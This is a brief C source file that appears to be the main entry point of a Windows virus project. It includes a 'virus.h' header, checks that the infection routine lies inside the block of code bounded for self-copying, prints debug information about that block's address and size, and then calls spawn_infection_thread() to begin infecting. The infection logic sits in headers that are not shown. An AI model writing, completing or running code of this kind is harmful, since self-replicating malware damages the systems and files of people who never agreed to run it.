#include <stdio.h>
#include <windows.h>

#include "code_begin.h"
#include "code_end.h"
#include "utility.h"
#include "virus.h"

#define ASSERT_FUNCTION_IN_BOUNDARIES(func) { assert((void*)func >= (void*)code_begin && (void*)func < (void*)code_end); }

int main(int argc, char **argv) {
  assert(IS_32_BIT);    // currently only 32 bit working, yet need to check for 64 bit compatibility/differences
  assert(IS_32_BIT || IS_64_BIT);
  assert(!(IS_32_BIT && IS_64_BIT));
  assert(code_begin < code_end);
  ASSERT_FUNCTION_IN_BOUNDARIES(spawn_infection_thread);

  if (IS_32_BIT) {
    printf("running 32 bit\n");
  }
  if (IS_64_BIT) {
    printf("running 64 bit\n");
  }
  PRINT_DEBUG("code_begin = 0x%p\n", code_begin);
  PRINT_DEBUG("code_end = 0x%p\n", code_end);
  PRINT_DEBUG("code_size = 0x%X\n", (uint32_t)((uint8_t*)code_end - (uint8_t*)code_begin));
  spawn_infection_thread();
  system("pause");
  return 0;
}
